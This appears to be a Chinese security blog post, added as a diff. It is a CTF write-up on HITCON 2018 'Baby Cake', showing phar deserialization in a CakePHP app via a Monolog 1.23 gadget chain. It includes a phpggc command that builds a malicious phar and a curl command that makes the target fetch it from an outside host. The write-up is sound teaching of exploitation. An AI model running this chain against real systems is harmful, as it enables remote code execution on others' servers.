@@ -1,0 +1,61 @@
+<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="与其哀叹，不如埋头苦干"><title>PHP反序列化入门之寻找POP链（三） | Mochazz's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script></head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/"></a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/tx.jpeg" width="128" height="128"></a><h1 class="ttl"><a href="/">Mochazz's blog</a></h1></div><p class="m-desc">与其哀叹，不如埋头苦干</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><span class="dot">●</span><span>友链</span><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lmxspace.com">l1nk3r</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.virzz.com">Virink</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://sec2hack.com">Wfox</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lsafe.org">离心</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.kingkk.com">kingkk</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://hpdoger.me">hpdoger</a></li></ul></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">PHP反序列化入门之寻找POP链（三）</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2019/02/14/PHP反序列化入门之寻找POP链（三）/">2019-02-14</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF竞赛训练/">CTF竞赛训练</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇文章，将以 <strong>HITCON2018</strong> 中的 <strong>Baby Cake</strong> 为例，继续练习 <strong>PHP POP链</strong> 寻找，题目 <strong>docker</strong> 环境地址：<a href="https://github.com/Tiaonmmn/hitcon_2018_babycake" target="_blank" rel="noopener">https://github.com/Tiaonmmn/hitcon_2018_babycake</a> 。题目所使用的框架为 <strong>Cake PHP</strong> ，具体可以参考：<a href="https://book.cakephp.org。" target="_blank" rel="noopener">https://book.cakephp.org。</a></p>
+<h2 id="漏洞点发掘"><a href="#漏洞点发掘" class="headerlink" title="漏洞点发掘"></a>漏洞点发掘</h2><p>题目界面如下：</p>
+<p><img src="/img/PHP反序列化入门之寻找POP链3/1.png" alt="1"></p>
+<p>我们先来看整个应用的 <strong>web</strong> 路由。通过查看 <strong>config/routes.php</strong> 文件，我们可以发现其入口点是 <strong>PagesController</strong> 类中的 <strong>display</strong> 方法.。(下图 <strong>第13行</strong> )</p>
+<p><img src="/img/PHP反序列化入门之寻找POP链3/2.png" alt="2"></p>
+<p>我们跟进 <strong>display</strong> 方法，发现 <strong>$url</strong> 只能以 <strong>http、https</strong> 开头，请求方法支持 <strong>get、post、put、delete、patch</strong> 五种。</p>
+<p><img src="/img/PHP反序列化入门之寻找POP链3/3.png" alt="3"></p>
+<p>然后会先判断缓存中是否存在相关页面内容及请求头(上图 <strong>第22行</strong> )，如果存在，则直接用 <strong>file_get_contents</strong> 从缓存中获取，其中请求头的内容还会反序列化一次，这里我们先暂且记下。缓存文件的路径是可以预测的，这对我们之后的攻击十分有利。(下图 <strong>第21行</strong> )</p>
+<p><img src="/img/PHP反序列化入门之寻找POP链3/4.png" alt="4"></p>
+<p>如果缓存文件不存在的话，就会先调用 <strong>PagesController</strong> 类的 <strong>httpclient</strong> 方法生成一个 <strong>Client</strong> 类，通过 <strong>Client</strong> 类生成响应数据，然后再将响应数据通过 <strong>PagesController</strong> 类的 <strong>cache_set</strong> 方法分别写入 <strong>body.cache</strong> 和 <strong>headers.cache</strong> 文件。其具体代码如下：</p>
+<p><img src="/img/PHP反序列化入门之寻找POP链3/5.png" alt="5"></p>
+<p>我们再来看这个响应数据是如何生成的，其调用了 <strong>Client</strong> 类的 <strong>get</strong> 方法（对应上图代码 <strong>第25行</strong> 。当然，这是在发起 <strong>GET</strong> 请求的基础上）。</p>
+<p><img src="/img/PHP反序列化入门之寻找POP链3/6.png" alt="6"></p>
+<p>我们跟进 <strong>_doRequest</strong> 方法，发现其调用了 <strong>_createRequest</strong> 方法，而 <strong>_createRequest</strong> 方法中实例了一个 <strong>Request</strong> 对象，该对象在创建时，又会调用 <strong>body</strong> 方法，我们继续跟进该方法。</p>
+<p><img src="/img/PHP反序列化入门之寻找POP链3/7.png" alt="7"></p>
+<p>如果我们传入的数据是数组类型的话， <strong>body</strong> 方法就会调用 <strong>FormData</strong> 类的 <strong>addMany</strong> 方法，然后 <strong>addMany</strong> 方法再调用 <strong>add</strong> 方法。而这个 <strong>add</strong> 方法我们需要注意一下，这是一个弃用功能，然而程序运行到这里时，并没有直接退出，还是继续调用 <strong>addFile</strong> 方法。他会把以 <strong>@</strong> 符号开头的字符串当做被上传文件的路径，并调用 <strong>addFile</strong> 方法进行上传，其功能类似 <strong>curl</strong> 命令上传文件行为，具体代码如下：</p>
+<p><img src="/img/PHP反序列化入门之寻找POP链3/8.png" alt="8"></p>
+<p><img src="/img/PHP反序列化入门之寻找POP链3/9.png" alt="9"></p>
+<p>我们看到 <strong>addFile</strong> 方法里面用到了 <strong>file_get_contents</strong> 函数获取内容，而且参数 <strong>$value</strong> 是我们可控的。那么我们便可结合前面的缓存功能，将构造的 <strong>phar</strong> 文件存入缓存文件中，由于缓存文件路径可知，我们便可通过 <strong>phar反序列化</strong> 进行攻击。</p>
+<h2 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h2><p>找到利用点之后，我们再来寻找 <strong>POP链</strong> ，先来看看题目中用到的组件。</p>
+<p><img src="/img/PHP反序列化入门之寻找POP链3/10.png" alt="10"></p>
+<p>我们发现题目用到了 <strong>monolog</strong> 组件版本为 <strong>1.23</strong> ，然而这个版本的 <strong>monolog</strong> 却存在 <strong>RCE</strong> ，我们可以通过 <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener"><strong>phpggc</strong></a> 来了解一下。</p>
+<p><img src="/img/PHP反序列化入门之寻找POP链3/11.png" alt="11"></p>
+<p>其反序列化触发 <strong>RCE</strong> 时，类方法调用过程如下：</p>
+<p><img src="/img/PHP反序列化入门之寻找POP链3/12.png" alt="12"></p>
+<h2 id="完成攻击"><a href="#完成攻击" class="headerlink" title="完成攻击"></a>完成攻击</h2><p>理清上面整个 <strong>POP链</strong> 后，我们可以直接用 <strong>phpggc</strong> 生成攻击用的 <strong>phar</strong> 文件，命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./phpggc -p phar -o /var/www/html/demo.phar Monolog/RCE1 system id</span><br></pre></td></tr></table></figure>
+<p>生成恶意 <strong>phar</strong> 文件后，我们先将该文件存入 <strong>Web</strong> 应用的缓存中：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://题目IP/?url=http://xx.xx.xx.xx/demo.phar</span><br></pre></td></tr></table></figure>
+<p>然后根据代码计算出缓存文件存放路径，最后再发起一个 <strong>POST</strong> 请求，完成 <strong>phar反序列化</strong> 。</p>
+<p><img src="/img/PHP反序列化入门之寻找POP链3/13.png" alt="13"></p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="https://mochazz.github.io">Mochazz</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2019/02/14/PHP反序列化入门之寻找POP链（三）/">https://mochazz.github.io/2019/02/14/PHP反序列化入门之寻找POP链（三）/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://mochazz.github.io">Mochazz的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/CTF/">CTF</a></span></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2019/02/09/PHP反序列化入门之寻找POP链（二）/">PHP反序列化入门之寻找POP链（二） &gt;</a></div><div id="valine-comment"><style type="text/css">.v * { color: #CECECE; }
+.v a { color: #0F9FB4; }
+.v a:hover { color: #216C73; }
+.v li { list-style: inherit; }
+.v .vwrap { border: 1px solid #223441; border-radius: 0; }
+.v .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.v .vbtn { border-radius: 0; color: #cecece; background: none; }
+.v .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.v .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.v .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.v code, .v pre,.v .vlist .vcard .vhead .vsys { background: #203240; }
+.v .vlist .vcard .vcontent.expand:before { background: linear-gradient(180deg,hsla(206,33%,19%,0),hsla(206,33%,19%,.9)); }
+.v .vlist .vcard .vcontent.expand:after { background: hsla(206,33%,19%,.9); }</style><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'cFxDjSziPHq4xGCbSpRGkND7-gzGzoHsz',
+  appKey:'YhJIRxQHzY9Aix5pSGnYxKkv',
+  placeholder:'ヾﾉ≧∀≦)o留下评论再走吧',
+  avatar:'wavatar',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2017 - 2019 <a href="/." rel="nofollow">Mochazz's blog</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>
